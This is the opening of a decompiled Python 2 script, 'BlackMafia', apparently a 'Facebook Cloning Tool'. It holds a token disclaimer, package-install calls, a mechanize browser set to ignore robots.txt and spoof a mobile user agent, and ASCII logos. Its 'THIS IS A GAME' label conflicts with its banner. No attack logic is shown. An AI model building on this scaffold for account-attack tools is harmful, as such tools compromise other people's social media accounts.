# BLACK MAFIA 
#DECOMPILED BY HUNTERBOY ALAMIN
# THIS IS A GAME
import os, sys, time, mechanize, itertools, datetime, random, hashlib, re, threading, json, getpass, urllib, cookielib
from multiprocessing.pool import ThreadPool
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
my_color = [
 P, M, H, K, B, U, O]
warna = random.choice(my_color)
warni = random.choice(my_color)

def pkgs():
    love('\x1b[1;91m\xc2\xab-----------------\x1b[1;96mBlackMafia\x1b[1;91m-----------------\xc2\xbb')
    love('\x1b[1;95m\xc2\xab\xc2\xab--WelCome To BlackMafia Tool New Update--\xc2\xbb\xc2\xbb')
    love('\x1b[1;96m\xc2\xab-----------------Disclaimer---------------\xc2\xbb')
    love('\x1b[1;91m     This Tool is for Educational Purpose')
    love('\x1b[1;93mThis presentation is for educational')
    love('\x1b[1;93mpurposes ONLY.How you use this information')
    love('\x1b[1;93mis your responsibility.I will not be')
    love("\x1b[1;93mheld accountable This Tool/Channel Doesn't")
    love('\x1b[1;93mSupport illegal activities.for any illegal')
    love('\x1b[1;93mActivitie This Tool is for Educational Purpose')
    love('\x1b[1;96m \xc2\xab-----------------\x1b[1;92mBlackMafia\x1b[1;96m--------------\xc2\xbb')
    time.sleep(0.01)
    os.system('apt install ruby -y && gem install lolcat')


try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')

try:
    import requests
except ImportError:
    os.system('pip2 install requests')
    os.system('python2 Cloning.py')

from requests.exceptions import ConnectionError
from mechanize import Browser
from datetime import datetime
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
os.system('clear')
done = False

def animate():
    for c in itertools.cycle(['\x1b[1;92m\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa110%', '\x1b[1;91m\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa120%', '\x1b[1;93m\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa130%', '\x1b[1;94m\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa140%', '\x1b[1;95m\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa150%', '\x1b[1;96m\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa160%', '\x1b[1;97m\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa170%', '\x1b[1;92m\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa180%', '\x1b[1;93m\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa190%', '\x1b[1;91m\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x88\x9a100%']):
        if done:
            break
        sys.stdout.write('\r\x1b[1;93mLoading ' + c)
        sys.stdout.flush()
        time.sleep(0.25)


t = threading.Thread(target=animate)
t.start()
time.sleep(2.5)
done = True

def keluar():
    print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} Back'
    os.sys.exit()


def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '%s;' % str(31 + j))

    x += ''
    x = x.replace('!0', '')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(1e-05)


logo = '\n\x1b[1;96m\n \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\n \xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\n \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\xa6\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x96\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91 \n \xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91 \n \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\xa6\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \n \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x96\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x96\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d \n \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91  \n \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \n \xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91 \n \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\n \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91          \n \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x96\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x96\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d \n \xe2\x97\x8f------ Your Mind is Your Best Weapon-------\xe2\x97\x8f\n\x1b[1;96m\xc2\xab-----------------\x1b[1;91mInstallation\x1b[1;96m-----------------\xc2\xbb'
logoa1 = '\n\x1b[1;95m\n               AAA                 1111111   \n              A:::A               1::::::1   \n             A:::::A             1:::::::1   \n            A:::::::A            111:::::1   \n           A:::::::::A              1::::1   \n          A:::::A:::::A             1::::1   \n         A:::::A A:::::A            1::::1   \n        A:::::A   A:::::A           1::::l   \n       A:::::A     A:::::A          1::::l   \n      A:::::AAAAAAAAA:::::A         1::::l   \n     A:::::::::::::::::::::A        1::::l   \n    A:::::AAAAAAAAAAAAA:::::A       1::::l   \n   A:::::A             A:::::A   111::::::111\n  A:::::A               A:::::A  1::::::::::1\n A:::::A                 A:::::A 1::::::::::1\nAAAAAAA                   AAAAAAA111111111111\n\x1b[1;95m\xc2\xab-\x1b[1;93mGroup Page Timeline Likes Frends Group Member\x1b[1;96m-\xc2\xbb\n\x1b[1;96m\xc2\xab-------------\x1b[1;92mfacebooK Cloning Tool\x1b[1;96m------------\xc2\xbb\n\x1b[1;96m\xc2\xab-----------------\x1b[1;91mInstallation\x1b[1;96m-----------------\xc2\xbb'
logob2 = '\n\x1b[1;96m\nBBBBBBBBBBBBBBBBB         222222222222222    \nB::::::::::::::::B       2:::::::::::::::22  \nB::::::BBBBBB:::::B      2::::::222222:::::2 \nBB:::::B     B:::::B     2222222     2:::::2 \n  B::::B     B:::::B                 2:::::2 \n  B::::B     B:::::B                 2:::::2 \n  B::::BBBBBB:::::B               2222::::2  \n  B:::::::::::::BB           22222::::::22   \n  B::::BBBBBB:::::B        22::::::::222     \n  B::::B     B:::::B      2:::::22222        \n  B::::B     B:::::B     2:::::2             \n  B::::B     B:::::B     2:::::2             \nBB:::::BBBBBB::::::B     2:::::2       222222\nB:::::::::::::::::B      2::::::2222222:::::2\nB::::::::::::::::B       2::::::::::::::::::2\nBBBBBBBBBBBBBBBBB        22222222222222222222\n\x1b[1;96m\xc2\xab-----------------\x1b[1;91mInstallation\x1b[1;96m-----------------\xc2\xbb'
logoc3 = '\n\x1b[1;96m\n        CCCCCCCCCCCCC      333333333333333   \n     CCC::::::::::::C     3:::::::::::::::33 \n   CC:::::::::::::::C     3::::::33333::::::3\n  C:::::CCCCCCCC::::C     3333333     3:::::3\n C:::::C       CCCCCC                 3:::::3\nC:::::C                               3:::::3\nC:::::C                       33333333:::::3 \nC:::::C                       3:::::::::::3  \nC:::::C                       33333333:::::3 \nC:::::C                               3:::::3\nC:::::C                               3:::::3\n C:::::C       CCCCCC                 3:::::3\n  C:::::CCCCCCCC::::C     3333333     3:::::3\n   CC:::::::::::::::C     3::::::33333::::::3\n     CCC::::::::::::C     3:::::::::::::::33 \n        CCCCCCCCCCCCC      333333333333333\n\x1b[1;96m\xc2\xab-----------------\x1b[1;91mInstallation\x1b[1;96m-----------------\xc2\xbb'
logod4 = '\n\x1b[1;95m\nDDDDDDDDDDDDD                    444444444  \nD::::::::::::DDD                4::::::::4  \nD:::::::::::::::DD             4:::::::::4  \nDDD:::::DDDDD:::::D           4::::44::::4  \n  D:::::D    D:::::D         4::::4 4::::4  \n  D:::::D     D:::::D       4::::4  4::::4  \n  D:::::D     D:::::D      4::::4   4::::4  \n  D:::::D     D:::::D     4::::444444::::444\n  D:::::D     D:::::D     4::::::::::::::::4\n  D:::::D     D:::::D     4444444444:::::444\n  D:::::D     D:::::D               4::::4  \n  D:::::D    D:::::D                4::::4  \nDDD:::::DDDDD:::::D                 4::::4  \nD:::::::::::::::DD                44::::::44\nD::::::::::::DDD                  4::::::::4\nDDDDDDDDDDDDD                     4444444444\n\x1b[1;96m\xc2\xab-----------------\x1b[1;91mInstallation\x1b[1;96m-----------------\xc2\xbb'
logoe5 = '\n\x1b[1;93m\nEEEEEEEEEEEEEEEEEEEEEE     555555555555555555 \nE::::::::::::::::::::E     5::::::::::::::::5 \nE::::::::::::::::::::E     5::::::::::::::::5 \nEE::::::EEEEEEEEE::::E     5:::::555555555555 \n  E:::::E       EEEEEE     5:::::5            \n  E:::::E                  5:::::5            \n  E::::::EEEEEEEEEE        5:::::5555555555   \n  E:::::::::::::::E        5:::::::::::::::5  \n  E:::::::::::::::E        555555555555:::::5 \n  E::::::EEEEEEEEEE                    5:::::5\n  E:::::E                              5:::::5\n  E:::::E       EEEEEE     5555555     5:::::5\nEE::::::EEEEEEEE:::::E     5::::::55555::::::5\nE::::::::::::::::::::E      55:::::::::::::55 \nE::::::::::::::::::::E        55:::::::::55   \nEEEEEEEEEEEEEEEEEEEEEE          555555555                                     \n\x1b[1;96m\xc2\xab-----------------\x1b[1;91mInstallation\x1b[1;96m-----------------\xc2\xbb'
logof6 = '\n\x1b[1;94m\nFFFFFFFFFFFFFFFFFFFFFF        66666666   \nF::::::::::::::::::::F       6::::::6    \nF::::::::::::::::::::F      6::::::6     \nFF::::::FFFFFFFFF::::F     6::::::6      \n  F:::::F       FFFFFF    6::::::6       \n  F:::::F                6::::::6        \n  F::::::FFFFFFFFFF     6::::::6         \n  F:::::::::::::::F    6::::::::66666    \n  F:::::::::::::::F   6::::::::::::::66  \n  F::::::FFFFFFFFFF   6::::::66666:::::6 \n  F:::::F             6:::::6     6:::::6\n  F:::::F             6:::::6     6:::::6\nFF:::::::FF           6::::::66666::::::6\nF::::::::FF            66:::::::::::::66 \nF::::::::FF              66:::::::::66   \nFFFFFFFFFFF                666666666\n\x1b[1;96m\xc2\xab-----------------\x1b[1;91mInstallation\x1b[1;96m-----------------\xc2\xbb'
logog7 = '\n\x1b[1;91m\n        GGGGGGGGGGGGG     77777777777777777777\n     GGG::::::::::::G     7::::::::::::::::::7\n   GG:::::::::::::::G     7::::::::::::::::::7\n  G:::::GGGGGGGG::::G     777777777777:::::::7\n G:::::G       GGGGGG                7::::::7 \nG:::::G                             7::::::7  \nG:::::G                            7::::::7   \nG:::::G    GGGGGGGGGG             7::::::7    \nG:::::G    G::::::::G            7::::::7     \nG:::::G    GGGGG::::G           7::::::7      \nG:::::G        G::::G          7::::::7       \n G:::::G       G::::G         7::::::7        \n  G:::::GGGGGGGG::::G        7::::::7         \n   GG:::::::::::::::G       7::::::7          \n     GGG::::::GGG:::G      7::::::7           \n        GGGGGG   GGGG     77777777               \n\x1b[1;96m\xc2\xab-----------------\x1b[1;91mInstallation\x1b[1;96m-----------------\xc2\xbb'
logoa = '\n\x1b[1;92m\n               AAA               \n              A:::A              \n             A:::::A             \n            A:::::::A            \n           A:::::::::A           \n          A:::::A:::::A          \n         A:::::A A:::::A         \n        A:::::A   A:::::A        \n       A:::::A     A:::::A       \n      A:::::AAAAAAAAA:::::A      \n     A:::::::::::::::::::::A     \n    A:::::AAAAAAAAAAAAA:::::A    \n   A:::::A             A:::::A   \n  A:::::A               A:::::A  \n A:::::A                 A:::::A \nAAAAAAA                   AAAAAAA\n\x1b[1;96m\xc2\xab-----------------\x1b[1;91mInstallation\x1b[1;96m-----------------\xc2\xbb'
logob = '\n\x1b[1;96m\nBBBBBBBBBBBBBBBBB   \nB::::::::::::::::B  \nB::::::BBBBBB:::::B \nBB:::::B     B:::::B\n  B::::B     B:::::B\n  B::::B     B:::::B\n  B::::BBBBBB:::::B \n  B:::::::::::::BB  \n  B::::BBBBBB:::::B \n  B::::B     B:::::B\n  B::::B     B:::::B\n  B::::B     B:::::B\nBB:::::BBBBBB::::::B\nB:::::::::::::::::B \nB::::::::::::::::B  \nBBBBBBBBBBBBBBBBB   \n\x1b[1;96m\xc2\xab-----------------\x1b[1;91mInstallation\x1b[1;96m-----------------\xc2\xbb'
logoc = '\n\x1b[1;93m\n        CCCCCCCCCCCCC\n     CCC::::::::::::C\n   CC:::::::::::::::C\n  C:::::CCCCCCCC::::C\n C:::::C       CCCCCC\nC:::::C              \nC:::::C              \nC:::::C              \nC:::::C              \nC:::::C              \nC:::::C              \n C:::::C       CCCCCC\n  C:::::CCCCCCCC::::C\n   CC:::::::::::::::C\n     CCC::::::::::::C\n        CCCCCCCCCCCCC\n\x1b[1;96m\xc2\xab-----------------\x1b[1;91mInstallation\x1b[1;96m-----------------\xc2\xbb'
logod = '\n\x1b[1;96m\nDDDDDDDDDDDDD        \nD::::::::::::DDD     \nD:::::::::::::::DD   \nDDD:::::DDDDD:::::D  \n  D:::::D    D:::::D \n  D:::::D     D:::::D\n  D:::::D     D:::::D\n  D:::::D     D:::::D\n  D:::::D     D:::::D\n  D:::::D     D:::::D\n  D:::::D     D:::::D\n  D:::::D    D:::::D \nDDD:::::DDDDD:::::D  \nD:::::::::::::::DD   \nD::::::::::::DDD     \nDDDDDDDDDDDDD  \n\x1b[1;96m\xc2\xab-----------------\x1b[1;91mInstallation\x1b[1;96m-----------------\xc2\xbb'
logoe = '\n\x1b[1;96m\nEEEEEEEEEEEEEEEEEEEEEE\nE::::::::::::::::::::E\nE::::::::::::::::::::E\nEE::::::EEEEEEEEE::::E\n  E:::::E       EEEEEE\n  E:::::E             \n  E::::::EEEEEEEEEE   \n  E:::::::::::::::E   \n  E:::::::::::::::E   \n  E::::::EEEEEEEEEE   \n  E:::::E             \n  E:::::E       EEEEEE\nEE::::::EEEEEEEE:::::E\nE::::::::::::::::::::E\nE::::::::::::::::::::E\nEEEEEEEEEEEEEEEEEEEEEE\n\x1b[1;96m\xc2\xab-----------------\x1b[1;91mInstallation\x1b[1;96m-----------------\xc2\xbb'
logof = '\n\x1b[1;96m\nFFFFFFFFFFFFFFFFFFFFFF\nF::::::::::::::::::::F\nF::::::::::::::::::::F\nFF::::::FFFFFFFFF::::F\n  F:::::F       FFFFFF\n  F:::::F             \n  F::::::FFFFFFFFFF   \n  F:::::::::::::::F   \n  F:::::::::::::::F   \n  F::::::FFFFFFFFFF   \n  F:::::F             \n  F:::::F             \nFF:::::::FF           \nF::::::::FF           \nF::::::::FF           \nFFFFFFFFFFF\n\x1b[1;96m\xc2\xab-----------------\x1b[1;91mInstallation\x1b[1;96m-----------------\xc2\xbb'
logog = '\n\x1b[1;96m\n        GGGGGGGGGGGGG\n     GGG::::::::::::G\n   GG:::::::::::::::G\n  G:::::GGGGGGGG::::G\n G:::::G       GGGGGG\nG:::::G              \nG:::::G              \nG:::::G    GGGGGGGGGG\nG:::::G    G::::::::G\nG:::::G    GGGGG::::G\nG:::::G        G::::G\n G:::::G       G::::G\n  G:::::GGGGGGGG::::G\n   GG:::::::::::::::G\n     GGG::::::GGG:::G\n        GGGGGG   GGGG\n\x1b[1;96m\xc2\xab-----------------\x1b[1;91mInstallation\x1b[1;96m-----------------\xc2\xbb'
logoh = '\n\x1b[1;96m\nHHHHHHHHH     HHHHHHHHH\nH:::::::H     H:::::::H\nH:::::::H     H:::::::H\nHH::::::H     H::::::HH\n  H:::::H     H:::::H  \n  H:::::H     H:::::H  \n  H::::::HHHHH::::::H  \n  H:::::::::::::::::H  \n  H:::::::::::::::::H  \n  H::::::HHHHH::::::H  \n  H:::::H     H:::::H  \n  H:::::H     H:::::H  \nHH::::::H     H::::::HH\nH:::::::H     H:::::::H\nH:::::::H     H:::::::H\nHHHHHHHHH     HHHHHHHHH\n\x1b[1;96m\xc2\xab-----------------\x1b[1;91mInstallation\x1b[1;96m-----------------\xc2\xbb'
